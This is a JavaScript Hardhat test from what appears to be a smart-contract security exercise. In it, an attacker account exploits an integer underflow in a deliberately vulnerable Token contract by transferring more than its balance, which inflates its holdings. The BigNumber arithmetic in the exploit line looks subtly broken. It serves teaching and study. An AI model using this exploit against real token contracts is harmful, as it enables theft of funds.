const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Exercise 5 - Token", function () {

    let deployer, attacker;
    const INITIAL_SUPPLY = ethers.utils.parseUnits('1000', 'ether');
    const ATTACKER_INITIAL_BALANCE = ethers.utils.parseUnits('20', 'ether');

    beforeEach(async function () {

        [deployer, attacker] = await ethers.getSigners();

        // Deploy vulnerable contract
        const Token = await ethers.getContractFactory("Token", deployer);
        this.contract = await Token.deploy(INITIAL_SUPPLY);

        // Total supply belongs to deployer address
        expect(await this.contract.balanceOf(deployer.address)).to.eq(INITIAL_SUPPLY);

        const tx = await this.contract.transfer(attacker.address, ATTACKER_INITIAL_BALANCE);
        await tx.wait()

        const attackerInitialBalance = await this.contract.balanceOf(attacker.address);
        expect(attackerInitialBalance).to.eq(ATTACKER_INITIAL_BALANCE);
        console.log(`Attacker's initial balance is ${ethers.utils.formatEther(attackerInitialBalance)} tokens`);
    });

    it("Underflow attackers balance", async function () {
        // Send +tokens of balance to make the underflow
        // Send 20+ tokens to attacker
        const tx = await this.contract.connect(attacker).transfer(ethers.constants.AddressZero, ATTACKER_INITIAL_BALANCE + 1);
        await tx.wait();

        const attackerBalance = await this.contract.balanceOf(attacker.address);
        expect(attackerBalance).is.above(ATTACKER_INITIAL_BALANCE);
        console.log(`Attacker's final balance is ${ethers.utils.formatEther(attackerBalance)} tokens`);

    });

});
